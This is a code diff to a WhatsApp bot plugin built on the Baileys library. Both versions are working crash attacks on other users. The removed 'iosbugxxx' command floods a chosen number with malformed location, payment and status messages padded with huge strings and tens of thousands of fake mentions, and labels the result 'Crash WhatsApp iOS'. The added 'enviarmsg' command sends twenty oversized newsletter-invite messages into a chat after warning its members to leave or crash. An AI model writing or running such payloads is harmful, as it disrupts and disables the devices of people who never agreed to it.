@@ -1,141 +1,87 @@
-let handler = async (m, { conn, text }) => {
-  const targetId = text
-    ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    : m.sender;
+import fs from 'fs';
+import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
-  const doneios = `
-*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮͢𝐭𝐢𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
-⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
-⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp iOS
-⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Successfully
-  `.trim();
+const FILE_PATH = './mensajes_guardados.json';
 
+function wait(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+let handler = async (m, { conn }) => {
   try {
+    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');
+
+    const normalize = jid => jid.split('@')[0];
+    if (normalize(m.sender) !== normalize(conn.user.jid)) {
+      return m.reply('❌ Solo el número del bot puede usar este comando.');
+    }
+
     await conn.sendMessage(m.chat, {
-      image: { url: 'https://files.catbox.moe/w1isit.jpg' },
-      caption: doneios,
-      footer: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘢𝘶𝘴𝘦 𝘧𝘰𝘳 5 𝘮𝘪𝘯 𝘴𝘰 𝘣𝘰𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘣𝘢𝘯𝘯𝘦𝘥',
-      buttons: [
-        {
-          buttonId: '#',
-          buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
-          type: 1
-        }
-      ],
-      headerType: 4,
-      viewOnce: true
-    });
+      text: '🚨 Hey salte del chat o te dará crash. Tienes 30 segundos.',
+    }, { quoted: m });
 
-    for (let i = 0; i < 25; i++) {
-      await ios1(targetId, conn);
-      await ios2(targetId, conn);
-    }
+    setTimeout(async () => {
+      if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
+      const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
+      if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');
 
-    for (let i = 0; i < 25; i++) {
-      await protocolbug3(targetId, conn);
-      await bulldozer(targetId, conn);
-    }
+      for (let i = 0; i < 20; i++) {
+        // 1️⃣ Reenviar mensaje desde archivo
+        const reenviado = await conn.copyNForward(m.chat, mensaje, true);
+
+        // Eliminar localmente para el bot
+        await conn.sendMessage(conn.user.id, {
+          delete: {
+            remoteJid: m.chat,
+            fromMe: true,
+            id: reenviado.key.id,
+            participant: conn.user.id
+          }
+        });
+
+        // 2️⃣ Generar y enviar mensaje tipo canal
+        const travas = 'ꦾ'.repeat(90000);
+        const canalMessage = {
+          newsletterAdminInviteMessage: {
+            newsletterJid: "120363282786345717@newsletter",
+            newsletterName: "🗣🗣🗣🗣" + travas + travas,
+            jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
+            caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
+            inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
+          }
+        };
+
+        const generado = await generateWAMessageFromContent(m.chat, canalMessage, {
+          userJid: conn.user.id
+        });
+
+        await conn.relayMessage(m.chat, generado.message, { messageId: generado.key.id });
+
+        // Eliminar localmente para el bot
+        await conn.sendMessage(conn.user.id, {
+          delete: {
+            remoteJid: m.chat,
+            fromMe: true,
+            id: generado.key.id,
+            participant: conn.user.id
+          }
+        });
+
+        // Esperar 500ms entre envíos para evitar crashes del bot o bloqueos
+        await wait(500);
+      }
+
+      await conn.sendMessage(m.chat, {
+        text: '✅ Los 20 mensajes fueron enviados y eliminados localmente solo para el bot.'
+      }, { quoted: m });
+
+    }, 30000); // Esperar 30 segundos
 
   } catch (e) {
-    console.error(e);
-    m.reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗');
+    console.error('[ERROR enviarmsg]:', e);
+    return m.reply('❌ Error:\n' + (e.message || e));
   }
 };
 
-handler.command = ["iosbugxxx"];
-handler.premium = false;
+handler.command = ['enviarmsg'];
 export default handler;
-
-// === Funciones actualizadas ===
-
-async function ios1(target, conn) {
-  const crashText = "𑇂𑆵𑆴𑆿".repeat(90000);
-  await conn.relayMessage(
-    target,
-    {
-      locationMessage: {
-        degreesLatitude: 999.99999999999999,
-        degreesLongitude: -999.99999999999999,
-        name: crashText,
-        url: "https://youtube.com/@raldzzoffc",
-      },
-    },
-    {}
-  );
-}
-
-async function ios2(target, conn) {
-  await conn.relayMessage(target, {
-    paymentInviteMessage: {
-      serviceType: "CASHAPP",
-      expiryTimestamp: Date.now() + 1814400000
-    }
-  }, {});
-}
-
-async function protocolbug3(target, conn) {
-  const msg = generateWAMessageFromContent(target, {
-    viewOnceMessage: {
-      message: {
-        videoMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
-          mimetype: "video/mp4",
-          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
-          fileLength: "109951162777600",
-          seconds: 999999,
-          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
-          caption: "\u9999",
-          height: 999999,
-          width: 999999,
-          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
-          directPath: "/v/t62.7161-24/35743375.enc",
-          mediaKeyTimestamp: "1743742853",
-          contextInfo: {
-            isSampled: true,
-            mentionedJid: [
-              ...Array.from({ length: 30000 }, () =>
-                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-              )
-            ]
-          },
-        }
-      }
-    }
-  }, {});
-
-  await conn.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [target],
-  });
-}
-
-async function bulldozer(target, conn) {
-  const msg = generateWAMessageFromContent(target, {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
-          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-          mimetype: "image/webp",
-          directPath: "/v/t62.7161-24/10000000.enc",
-          fileLength: { low: 1, high: 99999, unsigned: true },
-          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-          firstFrameLength: 19904,
-          contextInfo: {
-            mentionedJid: Array.from({ length: 20000 }, () =>
-              "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
-            ),
-          },
-          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
-        }
-      }
-    }
-  }, {});
-
-  await conn.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [target],
-  });
-}
